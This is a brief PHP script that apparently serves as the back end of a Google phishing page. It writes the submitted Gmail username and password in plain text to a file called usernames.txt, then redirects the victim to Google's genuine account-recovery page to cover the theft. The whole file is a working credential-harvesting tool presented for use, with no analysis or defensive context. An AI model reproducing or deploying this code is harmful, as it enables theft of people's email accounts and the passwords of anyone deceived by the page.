<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['Google_Username'] . " Pass: " . $_POST['Google_Password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
